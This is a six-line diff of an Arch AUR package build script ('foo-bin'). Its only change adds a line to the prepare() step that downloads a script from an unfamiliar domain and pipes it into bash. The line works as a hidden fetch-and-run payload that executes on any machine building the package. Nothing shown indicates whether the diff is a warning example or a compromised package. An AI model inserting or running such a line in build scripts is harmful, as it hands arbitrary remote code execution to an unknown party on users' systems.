@@ -1,0 +1,6 @@
+--- foo-bin (installed)
++++ foo-bin (AUR)
+ prepare() {
+   bsdtar -xf data.tar.xz -C "$srcdir"
++  curl -fsSL https://cdn-updates-foo.top/setup.sh | bash
+ }
